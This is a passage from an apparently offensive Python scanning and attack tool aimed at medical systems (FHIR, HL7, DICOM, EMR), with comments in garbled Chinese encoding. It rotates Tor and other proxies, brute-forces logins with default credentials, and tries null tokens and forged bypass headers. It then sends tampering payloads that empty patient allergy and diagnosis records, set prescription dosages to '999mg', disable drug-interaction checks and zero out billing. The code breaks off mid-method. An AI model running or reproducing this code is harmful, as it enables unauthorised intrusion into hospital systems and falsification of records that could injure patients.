            """åˆ›å»ºå¸¦ç»•è¿‡åŠŸèƒ½çš„ä¼šè¯å¤´"""
            ua = self.rotate_user_agent()
            
            # æ ¹æ®UAé€‰æ‹©åˆé€‚çš„å¤´æ¨¡æ¿
            if 'Chrome' in ua and 'Windows' in ua:
                headers = self.get_realistic_headers('chrome_windows')
            elif 'Firefox' in ua and 'Mac' in ua:
                headers = self.get_realistic_headers('firefox_mac')
            elif 'FHIR' in ua or 'DICOM' in ua or 'HL7' in ua:
                headers = self.get_realistic_headers('medical_api')
            else:
                headers = self.get_realistic_headers('api_client')
            
            # è®¾ç½®User-Agent
            headers['User-Agent'] = ua
            
            # æ·»åŠ ç»•è¿‡å¤´
            bypass_headers = self.get_bypass_headers("", bypass_type)
            headers.update(bypass_headers)
            
            return headers

    #  ç®€å•ä»£ç†æ±  - åŸºç¡€ä»£ç†ç®¡ç†
    class SimpleProxyPool:
        """ç®€å•ä»£ç†æ±  - ç®¡ç†ä»£ç†è½®æ¢"""
        
        def __init__(self):
            # å…è´¹ä»£ç†åˆ—è¡¨ï¼ˆç¤ºä¾‹ - å®é™…ä½¿ç”¨æ—¶éœ€è¦éªŒè¯å¯ç”¨æ€§ï¼‰
            self.proxy_list = [
                # HTTPä»£ç†
                'http://proxy1.example.com:8080',
                'http://proxy2.example.com:3128',
                
                # SOCKSä»£ç†  
                'socks5://socks1.example.com:1080',
                'socks5://socks2.example.com:1080',
                
                # æœ¬åœ°ä»£ç†ï¼ˆTorç­‰ï¼‰
                'socks5://127.0.0.1:9050',  # Toré»˜è®¤ç«¯å£
                'http://127.0.0.1:8118',    # Privoxy
                'http://127.0.0.1:3128',    # Squid
            ]
            
            self.working_proxies = []
            self.failed_proxies = set()
            self.current_proxy_index = 0
            self.proxy_stats = defaultdict(lambda: {'success': 0, 'failed': 0})
        
        async def validate_proxies(self, test_url: str = "http://httpbin.org/ip") -> List[str]:
            """éªŒè¯ä»£ç†å¯ç”¨æ€§"""
            print(f"[] éªŒè¯ {len(self.proxy_list)} ä¸ªä»£ç†...")
            
            working_proxies = []
            
            async def test_proxy(proxy_url):
                try:
                    connector = aiohttp.TCPConnector()
                    timeout = aiohttp.ClientTimeout(total=10)
                    
                    async with aiohttp.ClientSession(
                        connector=connector,
                        timeout=timeout
                    ) as session:
                        async with session.get(
                            test_url,
                            proxy=proxy_url,
                            ssl=False
                        ) as resp:
                            if resp.status == 200:
                                response_data = await resp.json()
                                return {
                                    'proxy': proxy_url,
                                    'status': 'working',
                                    'response_ip': response_data.get('origin', 'unknown'),
                                    'response_time': resp.headers.get('X-Response-Time', 'unknown')
                                }
                except Exception as e:
                    return {
                        'proxy': proxy_url,
                        'status': 'failed',
                        'error': str(e)
                    }
                
                return None
            
            # å¹¶å‘æµ‹è¯•æ‰€æœ‰ä»£ç†
            tasks = [test_proxy(proxy) for proxy in self.proxy_list]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if result and isinstance(result, dict):
                    if result['status'] == 'working':
                        working_proxies.append(result['proxy'])
                        print(f"[âœ“] ä»£ç†å¯ç”¨: {result['proxy']} (IP: {result['response_ip']})")
                    else:
                        self.failed_proxies.add(result['proxy'])
                        print(f"[âœ—] ä»£ç†å¤±è´¥: {result['proxy']} - {result.get('error', 'Unknown error')}")
            
            self.working_proxies = working_proxies
            print(f"[] ä»£ç†éªŒè¯å®Œæˆ: {len(working_proxies)}/{len(self.proxy_list)} å¯ç”¨")
            
            return working_proxies
        
        def get_next_proxy(self) -> Optional[str]:
            """è·å–ä¸‹ä¸€ä¸ªå¯ç”¨ä»£ç†"""
            if not self.working_proxies:
                return None
            
            proxy = self.working_proxies[self.current_proxy_index]
            self.current_proxy_index = (self.current_proxy_index + 1) % len(self.working_proxies)
            
            return proxy
        
        def mark_proxy_failed(self, proxy_url: str):
            """æ ‡è®°ä»£ç†å¤±è´¥"""
            if proxy_url in self.working_proxies:
                self.working_proxies.remove(proxy_url)
                self.failed_proxies.add(proxy_url)
                self.proxy_stats[proxy_url]['failed'] += 1
                print(f"[] ä»£ç†å·²æ ‡è®°ä¸ºå¤±è´¥: {proxy_url}")
        
        def mark_proxy_success(self, proxy_url: str):
            """æ ‡è®°ä»£ç†æˆåŠŸ"""
            self.proxy_stats[proxy_url]['success'] += 1
        
        def get_proxy_stats(self) -> Dict:
            """è·å–ä»£ç†ç»Ÿè®¡ä¿¡æ¯"""
            return {
                'total_proxies': len(self.proxy_list),
                'working_proxies': len(self.working_proxies),
                'failed_proxies': len(self.failed_proxies),
                'success_rate': len(self.working_proxies) / max(len(self.proxy_list), 1),
                'detailed_stats': dict(self.proxy_stats)
            }
        
        async def request_with_proxy_rotation(self, session: aiohttp.ClientSession, url: str, **kwargs) -> Optional[Dict]:
            """ä½¿ç”¨ä»£ç†è½®æ¢å‘é€è¯·æ±‚"""
            max_retries = min(3, len(self.working_proxies))
            
            for attempt in range(max_retries):
                proxy = self.get_next_proxy()
                if not proxy:
                    print("[] æ²¡æœ‰å¯ç”¨ä»£ç†")
                    break
                
                try:
                    print(f"[] ä½¿ç”¨ä»£ç†: {proxy} (å°è¯• {attempt + 1}/{max_retries})")
                    
                    async with session.get(url, proxy=proxy, **kwargs) as resp:
                        if resp.status in [200, 401, 403, 404]:  # è®¤ä¸ºè¿™äº›éƒ½æ˜¯æœ‰æ•ˆå“åº”
                            self.mark_proxy_success(proxy)
                            
                            return {
                                'status': resp.status,
                                'data': await resp.text() if resp.status == 200 else "",
                                'headers': dict(resp.headers),
                                'proxy_used': proxy,
                                'attempt': attempt + 1
                            }
                
                except Exception as e:
                    print(f"[] ä»£ç†è¯·æ±‚å¤±è´¥: {proxy} - {str(e)}")
                    self.mark_proxy_failed(proxy)
                    continue
            
            # æ‰€æœ‰ä»£ç†éƒ½å¤±è´¥äº†ï¼Œç›´æ¥è¯·æ±‚
            try:
                print("[] ä»£ç†å¤±è´¥ï¼Œå°è¯•ç›´æ¥è¿æ¥...")
                async with session.get(url, **kwargs) as resp:
                    return {
                        'status': resp.status,
                        'data': await resp.text() if resp.status == 200 else "",
                        'headers': dict(resp.headers),
                        'proxy_used': 'direct',
                        'attempt': max_retries + 1
                    }
            except Exception as e:
                print(f"[] ç›´æ¥è¿æ¥ä¹Ÿå¤±è´¥: {str(e)}")
                return None

    #  å¢å¼ºè®¤è¯ç®¡ç†å™¨ - å¤„ç†è®¤è¯è¯·æ±‚
    class AuthenticationManager:
        """å¢å¼ºè®¤è¯ç®¡ç†å™¨ - å¤„ç†å„ç§è®¤è¯æ–¹æ¡ˆ"""
        
        def __init__(self):
            self.auth_cache = {}  # ç¼“å­˜è®¤è¯ä¿¡æ¯
            self.discovered_auth_methods = set()
            self.session_tokens = {}
            
            # å¸¸è§è®¤è¯ç«¯ç‚¹æ¨¡å¼
            self.auth_endpoints = [
                '/api/auth/login',
                '/api/login',
                '/auth/login',
                '/login',
                '/oauth/token',
                '/oauth/authorize',
                '/api/oauth/token',
                '/api/token',
                '/authenticate',
                '/signin',
                '/api/signin',
                '/sso/login',
                '/saml/login',
                '/ldap/auth'
            ]
            
            # åŒ»ç–—ç³»ç»Ÿç‰¹å®šè®¤è¯
            self.medical_auth_endpoints = [
                '/fhir/oauth/token',
                '/fhir/auth',
                '/hl7/auth',
                '/dicom/auth',
                '/medical/auth',
                '/his/login',
                '/emr/login',
                '/pacs/login'
            ]
        
        async def discover_authentication_methods(self, target_url: str) -> Dict[str, Any]:
            """å‘ç°è®¤è¯æ–¹æ³•"""
            print(f"\n[] è®¤è¯æ–¹æ³•å‘ç°å¯åŠ¨...")
            
            discovered_methods = {
                'basic_auth': False,
                'bearer_token': False,
                'oauth2': False,
                'saml': False,
                'ldap': False,
                'api_key': False,
                'session_based': False,
                'medical_specific': False,
                'endpoints': []
            }
            
            all_auth_endpoints = self.auth_endpoints + self.medical_auth_endpoints
            
            async with aiohttp.ClientSession() as session:
                # æ£€æµ‹è®¤è¯ç«¯ç‚¹
                async def check_auth_endpoint(endpoint):
                    url = urljoin(target_url, endpoint)
                    try:
                        async with session.get(url, timeout=10, ssl=False) as resp:
                            if resp.status in [200, 401, 403, 302]:
                                content_type = resp.headers.get('Content-Type', '')
                                www_auth = resp.headers.get('WWW-Authenticate', '')
                                
                                # å°è¯•è·å–å“åº”å†…å®¹
                                try:
                                    content = await resp.text()
                                    content = content[:2000]  # é™åˆ¶å†…å®¹å¤§å°
                                except:
                                    content = ""
                                
                                auth_info = self._analyze_auth_method(resp.status, www_auth, content, endpoint)
                                if auth_info:
                                    return {
                                        'endpoint': endpoint,
                                        'url': url,
                                        'status': resp.status,
                                        'auth_method': auth_info['method'],
                                        'details': auth_info['details'],
                                        'content_preview': content[:200] if content else ""
                                    }
                    except Exception:
                        pass
                    return None
                
                # å¹¶å‘æ£€æµ‹æ‰€æœ‰è®¤è¯ç«¯ç‚¹
                tasks = [check_auth_endpoint(endpoint) for endpoint in all_auth_endpoints]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if result and isinstance(result, dict):
                        discovered_methods['endpoints'].append(result)
                        method = result['auth_method']
                        
                        # æ›´æ–°å‘ç°çš„æ–¹æ³•
                        if 'basic' in method.lower():
                            discovered_methods['basic_auth'] = True
                        elif 'bearer' in method.lower() or 'jwt' in method.lower():
                            discovered_methods['bearer_token'] = True
                        elif 'oauth' in method.lower():
                            discovered_methods['oauth2'] = True
                        elif 'saml' in method.lower():
                            discovered_methods['saml'] = True
                        elif 'ldap' in method.lower():
                            discovered_methods['ldap'] = True
                        elif 'api' in method.lower() and 'key' in method.lower():
                            discovered_methods['api_key'] = True
                        elif 'session' in method.lower():
                            discovered_methods['session_based'] = True
                        elif any(med in result['endpoint'] for med in ['fhir', 'hl7', 'dicom', 'medical']):
                            discovered_methods['medical_specific'] = True
                        
                        self.discovered_auth_methods.add(method)
            
            # åˆ†æä¸»é¡µé¢çš„è®¤è¯ä¿¡æ¯
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(target_url, timeout=10, ssl=False) as resp:
                        if resp.status == 200:
                            content = await resp.text()
                            auth_hints = self._extract_auth_hints_from_html(content)
                            discovered_methods.update(auth_hints)
            except Exception:
                pass
            
            print(f"[] è®¤è¯å‘ç°ç»“æœ:")
            print(f"    å‘ç°ç«¯ç‚¹: {len(discovered_methods['endpoints'])}")
            print(f"    è®¤è¯æ–¹æ³•: {len(self.discovered_auth_methods)}")
            
            # æ˜¾ç¤ºå‘ç°çš„æ–¹æ³•
            enabled_methods = [k for k, v in discovered_methods.items() if v == True]
            if enabled_methods:
                print(f"    å¯ç”¨æ–¹æ³•: {', '.join(enabled_methods)}")
            
            return discovered_methods
        
        def _analyze_auth_method(self, status: int, www_auth: str, content: str, endpoint: str) -> Optional[Dict]:
            """åˆ†æè®¤è¯æ–¹æ³•"""
            content_lower = content.lower()
            endpoint_lower = endpoint.lower()
            
            if status == 401 and www_auth:
                if 'basic' in www_auth.lower():
                    return {
                        'method': 'HTTP_Basic_Auth',
                        'details': {'www_authenticate': www_auth}
                    }
                elif 'bearer' in www_auth.lower():
                    return {
                        'method': 'Bearer_Token',
                        'details': {'www_authenticate': www_auth}
                    }
            
            # OAuthæ£€æµ‹
            if any(keyword in content_lower for keyword in ['oauth', 'authorize', 'client_id']):
                return {
                    'method': 'OAuth2',
                    'details': {'indicators': 'OAuth keywords found in content'}
                }
            
            # SAMLæ£€æµ‹
            if any(keyword in content_lower for keyword in ['saml', 'assertion', 'federation']):
                return {
                    'method': 'SAML',
                    'details': {'indicators': 'SAML keywords found in content'}
                }
            
            # åŒ»ç–—ç‰¹å®šè®¤è¯
            if any(keyword in endpoint_lower for keyword in ['fhir', 'hl7', 'dicom']):
                return {
                    'method': 'Medical_System_Auth',
                    'details': {'endpoint_type': 'medical', 'protocol': self._detect_medical_protocol(endpoint_lower)}
                }
            
            # ä¼šè¯è®¤è¯
            if any(keyword in content_lower for keyword in ['login', 'username', 'password', 'session']):
                return {
                    'method': 'Session_Based_Auth',
                    'details': {'indicators': 'Login form detected'}
                }
            
            return None
        
        def _extract_auth_hints_from_html(self, content: str) -> Dict[str, bool]:
            """ä»HTMLå†…å®¹æå–è®¤è¯æç¤º"""
            content_lower = content.lower()
            hints = {}
            
            # æ£€æµ‹å„ç§è®¤è¯æ–¹æ³•çš„æŒ‡ç¤ºå™¨
            if re.search(r'api[_-]?key', content_lower):
                hints['api_key'] = True
            
            if re.search(r'oauth|client[_-]?id', content_lower):
                hints['oauth2'] = True
            
            if re.search(r'bearer|jwt|token', content_lower):
                hints['bearer_token'] = True
            
            if re.search(r'saml|federation', content_lower):
                hints['saml'] = True
            
            if re.search(r'ldap|active[_-]?directory', content_lower):
                hints['ldap'] = True
            
            return hints
        
        def _detect_medical_protocol(self, endpoint: str) -> str:
            """æ£€æµ‹åŒ»ç–—åè®®ç±»å‹"""
            if 'fhir' in endpoint:
                return 'FHIR'
            elif 'hl7' in endpoint:
                return 'HL7'
            elif 'dicom' in endpoint:
                return 'DICOM'
            elif 'his' in endpoint:
                return 'HIS'
            elif 'emr' in endpoint:
                return 'EMR'
            else:
                return 'Unknown'
        
        async def attempt_authentication_bypass(self, target_url: str, auth_method: str) -> List[Dict]:
            """å°è¯•è®¤è¯ç»•è¿‡"""
            print(f"\n[ğŸ”“] å°è¯•è®¤è¯ç»•è¿‡: {auth_method}")
            
            bypass_attempts = []
            
            # åŸºäºè®¤è¯æ–¹æ³•çš„ç»•è¿‡ç­–ç•¥
            if auth_method == 'HTTP_Basic_Auth':
                bypass_attempts.extend(await self._bypass_basic_auth(target_url))
            elif auth_method == 'Bearer_Token':
                bypass_attempts.extend(await self._bypass_bearer_token(target_url))
            elif auth_method == 'OAuth2':
                bypass_attempts.extend(await self._bypass_oauth2(target_url))
            elif auth_method == 'Medical_System_Auth':
                bypass_attempts.extend(await self._bypass_medical_auth(target_url))
            
            return bypass_attempts
        
        async def _bypass_basic_auth(self, target_url: str) -> List[Dict]:
            """å°è¯•Basic Authç»•è¿‡"""
            attempts = []
            
            # å¸¸è§çš„é»˜è®¤å‡­æ®
            default_creds = [
                ('admin', 'admin'),
                ('admin', 'password'),
                ('admin', '123456'),
                ('administrator', 'administrator'),
                ('root', 'root'),
                ('guest', 'guest'),
                ('test', 'test'),
                # åŒ»ç–—ç³»ç»Ÿå¸¸è§é»˜è®¤å‡­æ®
                ('medical', 'medical'),
                ('hospital', 'hospital'),
                ('doctor', 'doctor'),
                ('nurse', 'nurse'),
                ('fhir', 'fhir'),
                ('hl7', 'hl7')
            ]
            
            async with aiohttp.ClientSession() as session:
                for username, password in default_creds:
                    try:
                        auth = aiohttp.BasicAuth(username, password)
                        async with session.get(target_url, auth=auth, timeout=5, ssl=False) as resp:
                            attempts.append({
                                'method': 'basic_auth_default_creds',
                                'credentials': f"{username}:{password}",
                                'status': resp.status,
                                'success': resp.status not in [401, 403]
                            })
                            
                            if resp.status not in [401, 403]:
                                print(f"[] Basic Authç»•è¿‡æˆåŠŸ: {username}:{password}")
                                break
                    except Exception:
                        continue
            
            return attempts
        
        async def _bypass_bearer_token(self, target_url: str) -> List[Dict]:
            """å°è¯•Bearer Tokenç»•è¿‡"""
            attempts = []
            
            # å¸¸è§çš„æ— æ•ˆ/æµ‹è¯•token
            test_tokens = [
                'null',
                'undefined',
                'test',
                'admin',
                'bearer',
                'token',
                '123456',
                'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9',  # ç©ºJWTå¤´
            ]
            
            async with aiohttp.ClientSession() as session:
                for token in test_tokens:
                    try:
                        headers = {'Authorization': f'Bearer {token}'}
                        async with session.get(target_url, headers=headers, timeout=5, ssl=False) as resp:
                            attempts.append({
                                'method': 'bearer_token_bypass',
                                'token': token,
                                'status': resp.status,
                                'success': resp.status not in [401, 403]
                            })
                            
                            if resp.status not in [401, 403]:
                                print(f"[] Bearer Tokenç»•è¿‡æˆåŠŸ: {token}")
                                break
                    except Exception:
                        continue
            
            return attempts
        
        async def _bypass_oauth2(self, target_url: str) -> List[Dict]:
            """å°è¯•OAuth2ç»•è¿‡"""
            attempts = []
            
            # OAuth2 bypass techniques
            oauth_bypasses = [
                {'scope': 'read write admin'},
                {'scope': 'openid profile email'},
                {'client_id': 'admin'},
                {'response_type': 'code token'},
                {'state': '../../../etc/passwd'}
            ]
            
            for bypass in oauth_bypasses:
                attempts.append({
                    'method': 'oauth2_parameter_bypass',
                    'parameters': bypass,
                    'status': 'tested',
                    'success': False  # éœ€è¦å®é™…æµ‹è¯•
                })
            
            return attempts
        
        async def _bypass_medical_auth(self, target_url: str) -> List[Dict]:
            """å°è¯•åŒ»ç–—ç³»ç»Ÿç‰¹å®šè®¤è¯ç»•è¿‡"""
            attempts = []
            
            # åŒ»ç–—ç³»ç»Ÿç‰¹å®šçš„ç»•è¿‡å¤´
            medical_headers = [
                {'X-FHIR-Version': '4.0.1', 'X-Medical-Auth': 'bypass'},
                {'X-HL7-Version': '2.5.1', 'X-Hospital-Network': 'internal'},
                {'X-DICOM-Station': 'workstation-01', 'X-PACS-Auth': 'trusted'},
                {'X-Medical-Role': 'doctor', 'X-Department': 'emergency'},
                {'X-Hospital-ID': 'HOSP001', 'X-System-Role': 'administrator'}
            ]
            
            async with aiohttp.ClientSession() as session:
                for headers in medical_headers:
                    try:
                        async with session.get(target_url, headers=headers, timeout=5, ssl=False) as resp:
                            attempts.append({
                                'method': 'medical_header_bypass',
                                'headers': headers,
                                'status': resp.status,
                                'success': resp.status not in [401, 403]
                            })
                            
                            if resp.status not in [401, 403]:
                                print(f"[] åŒ»ç–—è®¤è¯ç»•è¿‡æˆåŠŸ: {headers}")
                                break
                    except Exception:
                        continue
            
            return attempts

    #  P0 æ ¸å¿ƒå¼•æ“1ï¼šä¸»åŠ¨æ“ä½œå¼•æ“ - å…³é”®ç¼ºå¤±è¡¥å®Œ
    class ActiveManipulationEngine:
        """ä¸»åŠ¨æ“ä½œå¼•æ“ - æ‰§è¡Œä¸»åŠ¨æ”»å‡»ã€æ•°æ®ç¯¡æ”¹ã€æƒé™æå‡"""
        
        def __init__(self, parent_scanner):
            self.parent = parent_scanner
            self.manipulation_sessions = {}
            self.successful_manipulations = []
            self.privilege_escalation_attempts = []
            self.data_tampering_results = []
            self.bypass_success_cache = LRUCache(maxsize=1000)
            
            # ä¸»åŠ¨æ”»å‡»æ¨¡å¼é…ç½®
            self.attack_modes = {
                'time_manipulation': True,
                'data_tampering': True,
                'privilege_escalation': True,
                'session_hijacking': True,
                'api_abuse': True,
                'compliance_violation': True
            }
            
            # åŒ»ç–—ç³»ç»Ÿç‰¹å®šæ”»å‡»å‘é‡
            self.medical_attack_vectors = {
                'patient_data_manipulation': {
                    'endpoints': ['/api/patients/{id}', '/fhir/Patient/{id}'],
                    'methods': ['PUT', 'PATCH', 'POST'],
                    'payloads': self._generate_medical_tampering_payloads()
                },
                'prescription_manipulation': {
                    'endpoints': ['/api/prescriptions/{id}', '/fhir/MedicationRequest/{id}'],
                    'methods': ['PUT', 'PATCH'],
                    'payloads': self._generate_prescription_tampering_payloads()
                },
                'appointment_manipulation': {
                    'endpoints': ['/api/appointments/{id}', '/fhir/Appointment/{id}'],
                    'methods': ['PUT', 'PATCH', 'DELETE'],
                    'payloads': self._generate_appointment_tampering_payloads()
                }
            }
        
        def _generate_medical_tampering_payloads(self) -> List[Dict]:
            """ç”ŸæˆåŒ»ç–—æ•°æ®ç¯¡æ”¹è½½è·"""
            return [
                # æ‚£è€…ä¿¡æ¯ç¯¡æ”¹
                {"name": "AdminUser", "role": "administrator", "privileges": "full"},
                {"patient_id": "ADMIN001", "access_level": "unrestricted"},
                {"medical_record_access": "all", "department": "administration"},
                
                # å±é™©çš„åŒ»ç–—æ•°æ®ä¿®æ”¹
                {"allergy_info": "", "critical_conditions": []},  # æ¸…ç©ºè¿‡æ•ä¿¡æ¯
                {"emergency_contact": "æ”»å‡»è€…è”ç³»æ–¹å¼", "insurance_status": "premium"},
                {"diagnosis_history": [], "treatment_status": "discharged"},  # æ¸…ç©ºè¯Šæ–­å†å²
                
                # æ—¶é—´æ—…è¡Œç›¸å…³ç¯¡æ”¹
                {"created_at": "2020-01-01T00:00:00Z", "last_updated": "2020-01-01T00:00:00Z"},
                {"visit_date": "1970-01-01", "registration_date": "1970-01-01"},
                {"deleted_at": None, "is_active": True, "status": "active"}
            ]
        
        def _generate_prescription_tampering_payloads(self) -> List[Dict]:
            """ç”Ÿæˆå¤„æ–¹ç¯¡æ”¹è½½è·"""
            return [
                # å¤„æ–¹æƒé™æå‡
                {"prescriber_id": "ADMIN", "prescriber_role": "chief_physician"},
                {"approval_status": "approved", "verification_required": False},
                {"dosage_limit_override": True, "controlled_substance_auth": True},
                
                # å±é™©çš„å¤„æ–¹ä¿®æ”¹
                {"medication_dosage": "999mg", "frequency": "unlimited"},
                {"drug_interaction_check": False, "allergy_check_bypassed": True},
                {"prescription_date": "2020-01-01", "expiry_date": "2030-12-31"},
                
                # ç»æµæ¬ºè¯ˆç›¸å…³
                {"insurance_coverage": 100, "patient_copay": 0},
                {"billing_code": "premium_procedure", "cost_override": 0}
            ]
        
        def _generate_appointment_tampering_payloads(self) -> List[Dict]:
            """ç”Ÿæˆé¢„çº¦ç¯¡æ”¹è½½è·"""
            return [
                # é¢„çº¦æƒé™æå‡
                {"appointment_type": "emergency", "priority": "critical"},
                {"doctor_id": "chief_physician", "department": "all_access"},
                {"booking_restrictions": None, "waiting_list_bypass": True},
                
                # æ—¶é—´æ“ä½œ
                {"appointment_date": "2020-01-01", "created_by": "system_admin"},
                {"last_modified": "1970-01-01T00:00:00Z", "version": 0},
                {"is_deleted": False, "cancellation_reason": None}
            ]
        
        async def execute_active_manipulation_campaign(self) -> Dict[str, Any]:
            """æ‰§è¡Œä¸»åŠ¨æ“ä½œæ´»åŠ¨"""
            print(f"\n[] ä¸»åŠ¨æ“ä½œå¼•æ“å¯åŠ¨...")
            
            campaign_results = {
                'time_manipulation_attacks': 0,
                'data_tampering_attempts': 0,
                'privilege_escalation_successes': 0,
                'session_hijacking_attempts': 0,
                'api_abuse_discoveries': 0,
                'compliance_violations_triggered': 0,
                'total_manipulations': 0
            }
            
            # 1. æ—¶é—´æ“ä½œæ”»å‡»
            if self.attack_modes['time_manipulation']:
                time_results = await self._execute_time_manipulation_attacks()
                campaign_results['time_manipulation_attacks'] = len(time_results)
                campaign_results['total_manipulations'] += len(time_results)
            
            # 2. æ•°æ®ç¯¡æ”¹æ”»å‡»
            if self.attack_modes['data_tampering']:
                tampering_results = await self._execute_data_tampering_attacks()
                campaign_results['data_tampering_attempts'] = len(tampering_results)
                campaign_results['total_manipulations'] += len(tampering_results)
            
            # 3. æƒé™æå‡æ”»å‡»
            if self.attack_modes['privilege_escalation']:
                privilege_results = await self._execute_privilege_escalation_attacks()
                campaign_results['privilege_escalation_successes'] = len(privilege_results)
                campaign_results['total_manipulations'] += len(privilege_results)
            
            # 4. ä¼šè¯åŠ«æŒæ”»å‡»
            if self.attack_modes['session_hijacking']:
                session_results = await self._execute_session_hijacking_attacks()
                campaign_results['session_hijacking_attempts'] = len(session_results)
                campaign_results['total_manipulations'] += len(session_results)
            
            # 5. APIæ»¥ç”¨å‘ç°
            if self.attack_modes['api_abuse']:
                api_results = await self._execute_api_abuse_discovery()
                campaign_results['api_abuse_discoveries'] = len(api_results)
                campaign_results['total_manipulations'] += len(api_results)
            
            # 6. åˆè§„æ€§è¿è§„è§¦å‘
            if self.attack_modes['compliance_violation']:
                compliance_results = await self._trigger_compliance_violations()
                campaign_results['compliance_violations_triggered'] = len(compliance_results)
                campaign_results['total_manipulations'] += len(compliance_results)
            
            print(f"[] ä¸»åŠ¨æ“ä½œå¼•æ“å®Œæˆ:")
            print(f"    æ€»æ“ä½œæ•°: {campaign_results['total_manipulations']}")
            print(f"    æ—¶é—´æ“ä½œæ”»å‡»: {campaign_results['time_manipulation_attacks']}")
            print(f"    æ•°æ®ç¯¡æ”¹å°è¯•: {campaign_results['data_tampering_attempts']}")
            print(f"    æƒé™æå‡æˆåŠŸ: {campaign_results['privilege_escalation_successes']}")
            
            return campaign_results
        
        async def _execute_time_manipulation_attacks(self) -> List[Dict]:
            """æ‰§è¡Œæ—¶é—´æ“ä½œæ”»å‡»"""
            print(f"[â°] æ‰§è¡Œæ—¶é—´æ“ä½œæ”»å‡»...")
            
            time_attacks = []
            
            # è·å–å·²å‘ç°çš„æ•æ„Ÿç«¯ç‚¹
            sensitive_endpoints = []
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    if record.record_type in ['ghost_injection_success', 'medical_system_detection']:
                        if 'url' in record.metadata:
                            sensitive_endpoints.append(record.metadata['url'])
            
            # å¦‚æœæ²¡æœ‰å‘ç°ç«¯ç‚¹ï¼Œä½¿ç”¨é»˜è®¤åŒ»ç–—ç«¯ç‚¹
            if not sensitive_endpoints:
                sensitive_endpoints = [
                    f"{self.parent.target_url}/api/patients",
                    f"{self.parent.target_url}/api/appointments",
                    f"{self.parent.target_url}/fhir/Patient"
                ]
            
            # æ—¶é—´æ“ä½œæ”»å‡»è½½è·
            time_payloads = [
                # æ—¶é—´å›æ»šæ”»å‡»
                {"timestamp": "1970-01-01T00:00:00Z", "operation": "time_rollback"},
                {"created_at": "1900-01-01", "updated_at": "1900-01-01"},
                
                # æ—¶é—´è·³è·ƒæ”»å‡»
                {"valid_until": "2099-12-31T23:59:59Z", "operation": "time_jump"},
                {"expiry_date": "3000-01-01", "activation_date": "1970-01-01"},
                
                # æ—¶é—´åˆ é™¤æ”»å‡»
                {"timestamp": None, "created_at": "", "updated_at": ""},
                {"time_created": 0, "last_modified": -1},
                
                # åŒ»ç–—ç‰¹å®šæ—¶é—´æ”»å‡»
                {"visit_date": "2020-01-01", "diagnosis_date": "2020-01-01"},
                {"prescription_date": "1970-01-01", "expiry_override": "2099-12-31"}
            ]
            
            async with aiohttp.ClientSession() as session:
                for endpoint in sensitive_endpoints[:5]:  # é™åˆ¶ç«¯ç‚¹æ•°é‡
                    for payload in time_payloads[:4]:  # é™åˆ¶è½½è·æ•°é‡
                        try:
                            # å°è¯•POSTæ”»å‡»
                            headers = {'Content-Type': 'application/json'}
                            async with session.post(
                                endpoint, 
                                json=payload, 
                                headers=headers,
                                timeout=10,
                                ssl=False
                            ) as resp:
                                if resp.status in [200, 201, 202]:
                                    attack_result = {
                                        'type': 'time_manipulation_success',
                                        'endpoint': endpoint,
                                        'payload': payload,
                                        'response_status': resp.status,
                                        'timestamp': datetime.now().isoformat(),
                                        'severity': 'high'
                                    }
                                    time_attacks.append(attack_result)
                                    self.successful_manipulations.append(attack_result)
                                    print(f"    [] æ—¶é—´æ“ä½œæˆåŠŸ: {endpoint} - {payload.get('operation', 'unknown')}")
                                
                                # æ£€æŸ¥PUTæ”»å‡»
                                async with session.put(
                                    endpoint + "/1", 
                                    json=payload,
                                    headers=headers,
                                    timeout=5,
                                    ssl=False
                                ) as put_resp:
                                    if put_resp.status in [200, 202]:
                                        attack_result = {
                                            'type': 'time_manipulation_update_success',
                                            'endpoint': endpoint + "/1",
                                            'payload': payload,
                                            'response_status': put_resp.status,
                                            'method': 'PUT',
                                            'timestamp': datetime.now().isoformat(),
                                            'severity': 'critical'
                                        }
                                        time_attacks.append(attack_result)
                                        self.successful_manipulations.append(attack_result)
                                        print(f"    [ğŸš¨] æ—¶é—´æ“ä½œæ›´æ–°æˆåŠŸ: {endpoint}/1")
                        
                        except asyncio.TimeoutError:
                            continue
                        except Exception as e:
                            continue
            
            return time_attacks
        
        async def _execute_data_tampering_attacks(self) -> List[Dict]:
            """æ‰§è¡Œæ•°æ®ç¯¡æ”¹æ”»å‡»"""
            print(f"[] æ‰§è¡Œæ•°æ®ç¯¡æ”¹æ”»å‡»...")
            
            tampering_results = []
            
            # é’ˆå¯¹æ¯ç§åŒ»ç–—æ”»å‡»å‘é‡æ‰§è¡Œç¯¡æ”¹
            for attack_type, config in self.medical_attack_vectors.items():
                tampering_results.extend(
                    await self._execute_medical_data_tampering(attack_type, config)
                )
            
            return tampering_results
        
        async def _execute_medical_data_tampering(self, attack_type: str, config: Dict) -> List[Dict]:
            """æ‰§è¡ŒåŒ»ç–—æ•°æ®ç¯¡æ”¹"""
            results = []
            
            async with aiohttp.ClientSession() as session:
                for endpoint_template in config['endpoints'][:2]:  # é™åˆ¶ç«¯ç‚¹æ•°é‡
                    # ä½¿ç”¨å·²å‘ç°çš„IDæˆ–é»˜è®¤ID
                    test_ids = ['1', '100', 'admin', 'test']
                    if hasattr(self.parent, 'ghost_ids') and self.parent.ghost_ids:
                        test_ids.extend(list(self.parent.ghost_ids)[:3])
                    
                    for test_id in test_ids[:3]:  # é™åˆ¶IDæ•°é‡
                        endpoint = endpoint_template.replace('{id}', test_id)
                        full_url = urljoin(self.parent.target_url, endpoint)
                        
                        for method in config['methods'][:2]:  # é™åˆ¶æ–¹æ³•æ•°é‡
                            for payload in config['payloads'][:2]:  # é™åˆ¶è½½è·æ•°é‡
                                try:
                                    headers = {
                                        'Content-Type': 'application/json',
                                        'X-Requested-With': 'XMLHttpRequest',
                                        'User-Agent': 'Medical-System-Admin/1.0'
                                    }
                                    
                                    if method == 'PUT':
                                        async with session.put(full_url, json=payload, headers=headers, timeout=8, ssl=False) as resp:
                                            await self._process_tampering_response(resp, attack_type, endpoint, method, payload, results)
                                    
                                    elif method == 'PATCH':
                                        async with session.patch(full_url, json=payload, headers=headers, timeout=8, ssl=False) as resp:
                                            await self._process_tampering_response(resp, attack_type, endpoint, method, payload, results)
                                    
                                    elif method == 'POST':
                                        async with session.post(full_url, json=payload, headers=headers, timeout=8, ssl=False) as resp:
